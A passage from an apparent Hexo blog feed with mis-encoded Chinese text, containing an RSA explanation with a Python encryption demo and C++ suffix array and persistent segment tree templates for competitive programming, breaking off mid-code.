p_n^{a_n}$</p><p>$a_i$ä¸ºä»»æ„æ•´æ•°ï¼Œ$p_i$ä¸ºä»»æ„è´¨æ•°ï¼Œå°±æ˜¯è¯´ï¼Œä»»ä½•ä¸€ä¸ªå¤§äº2çš„æ•´æ•°ä¸€å®šä¼šæœ‰ä¸Šå¼æˆç«‹ã€‚</p><p>å®ƒçš„æ¬§æ‹‰å‡½æ•°åˆ™æ˜¯</p><p>$Ï†(n)=(p_1-1)p_1^{a_1-1}\times(p_2-1)p_2^{a_2-1}\times(p_3-1)p_3^{a_3-1}\timesâ€¦â€¦\times(p_n-1)p_n^{a_n-1}$</p><p>é‚£ä¹ˆæ¬§æ‹‰å®šç†çš„è¡¨è¾¾å¼æ˜¯ä»€ä¹ˆå‘¢ï¼Œé‚£å°±æ˜¯ä¸‹é¢è¿™ä¸ªå¼å­ï¼š</p><p>ä»»æ„æ­£æ•´æ•°aå’Œpï¼Œæœ‰ä»¥ä¸‹å¼å­æˆç«‹</p><p>$a^{Ï†(p)}\ \text{mod}\ p=1$</p><p>æœ‰äº†è¿™ä¸ªå¼å­ä¹‹åæˆ‘ä»¬å†ä»£å…¥ä¸Šé¢é‚£ä¸ªå¼å­ï¼Œå¯ä»¥å¾—åˆ°</p><p>$m^{e\times d}\ \text{mod}\  n=m^{1+kÏ†(n)}\ \text{mod}\ n$</p><p>è¿™é‡Œéœ€è¦ç”¨åˆ°ä¸€äº›ç®€å•çš„åŒä½™å®šç†ï¼š</p><p>$a\times b\ \text{mod}\ n=((a\ \text{mod}\ n)\times (b\ \text{mod}\ n))\ \text{mod}\ n$</p><p>é‚£ä¹ˆ$m^{1+kÏ†(n)}\ \text{mod}\ n=m*(m^{Ï†(n)}\ \text{mod}\ n)^k\ \text{mod}\ n$</p><p>è€Œæ‹¬å·é‡Œçš„è¡¨è¾¾å¼æ’ä¸º1ï¼Œæœ€åç»“æœå°±å˜æˆäº†$m$</p><p>å¯ä»¥å‘ç°ï¼Œå¦‚æœmä¸å¤§äºnï¼Œé‚£ä¹ˆmçš„å€¼åº”å½“æ˜¯å”¯ä¸€çš„ï¼Œè€ŒåŠ å¯†å‡ºç°çš„ä¸­é—´äº§ç‰©$c$è‹¥æ²¡æœ‰$d$åˆ™æ°¸è¿œæ— æ³•æ¨åˆ°å¾—åˆ°$m$ï¼Œè¿™ä¹Ÿå°±æ˜¯<code>RSA</code>ç®—æ³•çš„æ ¸å¿ƒäº†ã€‚</p><h2 id="RSAå¯†é’¥ç”Ÿæˆ"><a href="#RSAå¯†é’¥ç”Ÿæˆ" class="headerlink" title="RSAå¯†é’¥ç”Ÿæˆ"></a>RSAå¯†é’¥ç”Ÿæˆ</h2><p>è®²å®Œäº†åŸç†ä¹‹åæˆ‘ä»¬æ¥è®²è®²æ€ä¹ˆç”ŸæˆRSAå¯†é’¥ï¼Œé¦–å…ˆé€‰å–ä¸¤ä¸ªå¾ˆå¤§çš„è´¨æ•°p,qï¼Œè¿™é‡Œå¾—åˆ°n=p*qï¼Œé‚£ä¹ˆå®¹æ˜“å¾—åˆ°nçš„æ¬§æ‹‰å‡½æ•°$Ï†(n)=(p-1)\times (q-1)$</p><p>å†ä»»æ„é€‰å–ä¸€ä¸ªè´¨æ•°eä½œä¸ºåŠ å¯†è´¨æ•°ï¼Œä¹Ÿå¾ˆå®¹æ˜“ç®—å‡ºè§£å¯†æŒ‡æ•°$d=\text{inverse}(e,Ï†(n))$ ï¼Œinverseä¸ºæ±‚æ¨¡é€†å…ƒçš„å‡½æ•°ã€‚</p><p>$(e,n)$å°±æ˜¯å…¬é’¥ï¼Œ$(d,n)$å°±æ˜¯ç§é’¥ï¼Œè¿™æ ·æˆ‘ä»¬çš„å¯†é’¥å°±ç”Ÿæˆå®Œæ¯•äº†ã€‚</p><h2 id="pythonä»£ç å®ç°"><a href="#pythonä»£ç å®ç°" class="headerlink" title="pythonä»£ç å®ç°"></a>pythonä»£ç å®ç°</h2><p>è¿™é‡Œç”¨åˆ°ä¸€ä¸ª<code>Crypto</code>åº“ï¼Œå®‰è£…æ–¹æ³•ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure><p>demo:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">m=<span class="number">123456</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">dec=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(dec)</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><p><img src="/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/3.png" alt="3"></p><p>ä½ ä¹Ÿå¯ä»¥å¤šå–å‡ ä¸ªå…¶å®ƒçš„æ•°è¯•è¯•çœ‹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½å¾—åˆ°ä¸€æ ·çš„ç»“æœï¼Œå› ä¸ºè´¨æ•°éšæœºç”Ÿæˆï¼Œprint(c)è¿™ä¸€æ­¥ä¸èƒ½ä¿è¯ä¸€æ¨¡ä¸€æ ·ï¼Œä½†æ˜¯decçš„å€¼ä¸€å®šæ˜¯å’Œä½ è¾“å…¥çš„mä¸€æ ·çš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SAæ¿å­</title>
      <link href="/2022/04/02/SA%E6%9D%BF%E5%AD%90/"/>
      <url>/2022/04/02/SA%E6%9D%BF%E5%AD%90/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢åªæœ‰æ¿å­ã€‚</p><span id="more"></span><p>sa[i]ï¼šæ’åä¸ºiçš„åç¼€çš„ä¸‹æ ‡</p><p>rak[i]ï¼šåç¼€suff[i]çš„æ’å</p><p>Height[i]ï¼šåç¼€æŒ‰ç…§å­—å…¸æ’åºä¹‹åï¼Œè¯¥åç¼€ä¸ä¸Šä¸€ä¸ªåç¼€çš„æœ€é•¿å…¬å…±å‰ç¼€ï¼Œä¹Ÿå°±æ˜¯æ’åä¸ºiçš„åç¼€å­—ç¬¦ä¸²å’Œæ’åä¸ºi-1çš„åç¼€å­—ç¬¦ä¸²çš„æœ€é•¿å…¬å…±å‰ç¼€ã€‚</p><h2 id="DAç®—æ³•-O-nlogn"><a href="#DAç®—æ³•-O-nlogn" class="headerlink" title="DAç®—æ³•(O(nlogn))"></a>DAç®—æ³•(O(nlogn))</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">100010</span>;</span><br><span class="line"><span class="keyword">int</span> wa[N],wb[N],wv[N],wss[N],rak[N],height[N],cal[N],n,sa[N];</span><br><span class="line"><span class="keyword">char</span> s[N];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> *r,<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> l)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="keyword">return</span> r[a]==r[b]&amp;&amp;r[a+l]==r[b+l];&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">da</span><span class="params">(<span class="keyword">int</span> *r,<span class="keyword">int</span> *sa,<span class="keyword">int</span> n,<span class="keyword">int</span> M)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> i,j,p,*x=wa,*y=wb,*t;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;M;i++) wss[i]=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) wss[x[i]=r[i]]++;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;M;i++) wss[i]+=wss[i<span class="number">-1</span>];</span><br><span class="line">     <span class="keyword">for</span>(i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--) sa[--wss[x[i]]]=i;</span><br><span class="line">     <span class="keyword">for</span>(j=<span class="number">1</span>,p=<span class="number">1</span>;p&lt;n;j*=<span class="number">2</span>,M=p) &#123;</span><br><span class="line">        <span class="keyword">for</span>(p=<span class="number">0</span>,i=n-j;i&lt;n;i++) y[p++]=i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) <span class="keyword">if</span>(sa[i]&gt;=j) y[p++]=sa[i]-j;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) wv[i]=x[y[i]];</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;M;i++) wss[i]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) wss[wv[i]]++;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;M;i++) wss[i]+=wss[i<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--) sa[--wss[wv[i]]]=y[i];</span><br><span class="line">        <span class="keyword">for</span>(t=x,x=y,y=t,p=<span class="number">1</span>,x[sa[<span class="number">0</span>]]=<span class="number">0</span>,i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">        x[sa[i]]=<span class="built_in">cmp</span>(y,sa[i<span class="number">-1</span>],sa[i],j)?p<span class="number">-1</span>:p++;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calheight</span><span class="params">(<span class="keyword">int</span> *r,<span class="keyword">int</span> *sa,<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> i,j,k=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++) rak[sa[i]]=i;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;height[rak[i++]]=k)</span><br><span class="line">     <span class="keyword">for</span>(k?k--:<span class="number">0</span>,j=sa[rak[i]<span class="number">-1</span>];r[i+k]==r[j+k];k++);</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i;i--)rak[i]=rak[i<span class="number">-1</span>],sa[i]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cas=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    cin&gt;&gt;k;</span><br><span class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s+<span class="number">1</span>))&#123;</span><br><span class="line">        n=<span class="built_in">strlen</span>(s+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">            cal[i]=s[i];</span><br><span class="line">        cal[n+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">da</span>(cal+<span class="number">1</span>,sa,n+<span class="number">1</span>,<span class="number">200</span>);</span><br><span class="line">        <span class="built_in">calheight</span>(cal+<span class="number">1</span>,sa,n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,height[i]);</span><br><span class="line">        &#125;<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,sa[i]);</span><br><span class="line">        &#125;<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,rak[i]);</span><br><span class="line">        &#125;<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            ans+=rak[i]-height[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>,ans);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DC3ç®—æ³•-O-n"><a href="#DC3ç®—æ³•-O-n" class="headerlink" title="DC3ç®—æ³•(O(n))"></a>DC3ç®—æ³•(O(n))</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> F(x) ((x) / 3 + ((x) % 3 == 1 ? 0 : tb))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> G(x) ((x) &lt; tb ? (x) * 3 + 1 : ((x) - tb) * 3 + 2)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">3</span>*(<span class="number">1e5</span>+<span class="number">5</span>);</span><br><span class="line"><span class="keyword">int</span> wa[N], wb[N], ws[N], wv[N], sa[N];</span><br><span class="line"><span class="keyword">int</span> rak[N], height[N], cal[N],n;</span><br><span class="line"><span class="keyword">char</span> s[N],ans[N],s1[N];</span><br><span class="line"><span class="keyword">int</span> cnt[N];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">c0</span><span class="params">(<span class="keyword">int</span> *r, <span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> r[a] == r[b] &amp;&amp; r[a + <span class="number">1</span>] == r[b + <span class="number">1</span>] &amp;&amp; r[a + <span class="number">2</span>] == r[b + <span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">c12</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> *r, <span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (k == <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> r[a] &lt; r[b] || r[a] == r[b] &amp;&amp; <span class="built_in">c12</span>(<span class="number">1</span>, r, a + <span class="number">1</span>, b + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> r[a] &lt; r[b] || r[a] == r[b] &amp;&amp; wv[a + <span class="number">1</span>] &lt; wv[b + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Rsort</span><span class="params">(<span class="keyword">int</span> *r, <span class="keyword">int</span> *a, <span class="keyword">int</span> *b, <span class="keyword">int</span> n, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) wv[i] = r[a[i]];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) ws[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) ws[wv[i]]++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; i++) ws[i] += ws[i - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) b[--ws[wv[i]]] = a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dc3</span><span class="params">(<span class="keyword">int</span> *r, <span class="keyword">int</span> *sa, <span class="keyword">int</span> n, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, *rn = r + n, *san = sa + n, ta = <span class="number">0</span>, tb = (n + <span class="number">1</span>) / <span class="number">3</span>, tbc = <span class="number">0</span>, p;</span><br><span class="line">    r[n] = r[n + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) <span class="keyword">if</span> (i % <span class="number">3</span> != <span class="number">0</span>) wa[tbc++] = i;</span><br><span class="line">    <span class="built_in">Rsort</span>(r + <span class="number">2</span>, wa, wb, tbc, m);</span><br><span class="line">    <span class="built_in">Rsort</span>(r + <span class="number">1</span>, wb, wa, tbc, m);</span><br><span class="line">    <span class="built_in">Rsort</span>(r, wa, wb, tbc, m);</span><br><span class="line">    <span class="keyword">for</span> (p = <span class="number">1</span>, rn[<span class="built_in">F</span>(wb[<span class="number">0</span>])] = <span class="number">0</span>, i = <span class="number">1</span>; i &lt; tbc; i++)</span><br><span class="line">        rn[<span class="built_in">F</span>(wb[i])] = <span class="built_in">c0</span>(r, wb[i - <span class="number">1</span>], wb[i]) ? p - <span class="number">1</span> : p++;</span><br><span class="line">    <span class="keyword">if</span> (p &lt; tbc) <span class="built_in">dc3</span>(rn, san, tbc, p);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; tbc; i++) san[rn[i]] = i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; tbc; i++) <span class="keyword">if</span> (san[i] &lt; tb) wb[ta++] = san[i] * <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (n % <span class="number">3</span> == <span class="number">1</span>) wb[ta++] = n - <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">Rsort</span>(r, wb, wa, ta, m);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; tbc; i++) wv[wb[i] = <span class="built_in">G</span>(san[i])] = i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>, p = <span class="number">0</span>; i &lt; ta &amp;&amp; j &lt; tbc; p++)</span><br><span class="line">        sa[p] = <span class="built_in">c12</span>(wb[j] % <span class="number">3</span>, r, wa[i], wb[j]) ? wa[i++] : wb[j++];</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; ta; p++) sa[p] = wa[i++];</span><br><span class="line">    <span class="keyword">for</span> (; j &lt; tbc; p++) sa[p] = wb[j++];</span><br><span class="line">    <span class="comment">//for(int i=n;i;i--) rak[i]=rak[i-1];</span></span><br><span class="line">    <span class="comment">//for(int i=n;i;i--) sa[i]++;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calheight</span><span class="params">(<span class="keyword">int</span> *r, <span class="keyword">int</span> *sa, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) rak[sa[i]] = i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; height[rak[i++]] = k)</span><br><span class="line">        <span class="keyword">for</span> (k ? k-- : <span class="number">0</span>, j = sa[rak[i] - <span class="number">1</span>]; r[i + k] == r[j + k]; k++);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i;i--) rak[i]=rak[i<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i;i--) sa[i]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s+<span class="number">1</span>)&amp;&amp;s[<span class="number">1</span>] != <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">        n = <span class="built_in">strlen</span>(s+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">            cal[i] = s[i] - <span class="string">&#x27;a&#x27;</span> + <span class="number">1</span>;</span><br><span class="line">        cal[n+<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">dc3</span>(cal+<span class="number">1</span>, sa, n + <span class="number">1</span>, <span class="number">30</span>);</span><br><span class="line">        <span class="built_in">calheight</span>(cal+<span class="number">1</span>, sa, n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,height[i]);</span><br><span class="line">        &#125;<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å­—ç¬¦ä¸² </category>
          
          <category> SA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸»å¸­æ ‘çš„å­¦ä¹ </title>
      <link href="/2022/04/02/%E4%B8%BB%E5%B8%AD%E6%A0%91/"/>
      <url>/2022/04/02/%E4%B8%BB%E5%B8%AD%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<p>ä¸»å¸­æ ‘åº”ç”¨ä¹‹ä¸€ï¼šåŒºé—´ç¬¬kå¤§ï¼Œä¸­é—´è¿˜æœ‰ç”¨åˆ°vectorç¦»æ•£åŒ–</p><span id="more"></span><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">2e5</span>+<span class="number">10</span>;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;v;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l,r,sum;</span><br><span class="line">    <span class="comment">//lä¸ºä¸€ä¸ªç¦»æ•£åŒ–å˜é‡çš„å·¦è¾¹ç•Œï¼Œrä¸ºå³è¾¹ç•Œï¼Œéƒ½æ˜¯å¯¹äºå€¼åŸŸè€Œè¨€çš„ï¼Œsumå­˜å‚¨æ•°å€¼åœ¨[l,r]åŒºé—´å†…çš„æ•°çš„ä¸ªæ•° </span></span><br><span class="line">&#125;node;</span><br><span class="line">node tree[maxn*<span class="number">20</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">getid</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">lower_bound</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>(),x)-v.<span class="built_in">begin</span>()+<span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> 